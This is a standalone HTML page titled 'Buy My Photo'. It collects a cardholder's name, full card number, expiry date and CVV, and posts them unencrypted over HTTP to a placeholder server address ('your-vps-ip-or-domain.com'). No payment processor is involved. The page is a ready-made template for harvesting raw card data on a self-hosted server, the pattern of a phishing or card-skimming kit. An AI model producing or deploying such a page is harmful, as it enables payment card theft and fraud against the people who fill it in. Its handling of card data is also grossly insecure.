<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f8f8;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 500px;
      background: #fff;
      margin: 50px auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      color: #333;
    }

    img {
      width: 100%;
      border-radius: 10px;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      background-color: #28a745;
      color: white;
      padding: 15px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      margin-top: 25px;
      cursor: pointer;
    }

    button:hover {
      background-color: #218838;
    }

    .price {
      text-align: center;
      font-size: 18px;
      margin-bottom: 20px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Buy My Photo</h2>
    <div class="price">Price: $5.00</div>

    <form method="POST" action="http://your-vps-ip-or-domain.com">
      <label for="cardname">Cardholder Name</label>
      <input type="text" id="cardname" name="cardname" required>

      <label for="cardnumber">Card Number</label>
      <input type="text" id="cardnumber" name="cardnumber" maxlength="19" required>

      <label for="expdate">Expiration Date (MM/YY)</label>
      <input type="text" id="expdate" name="expdate" required>

      <label for="cvv">CVV</label>
      <input type="password" id="cvv" name="cvv" maxlength="4" required>

      <button type="submit">Buy Now</button>
    </form>
  </div>
</body>
</html>
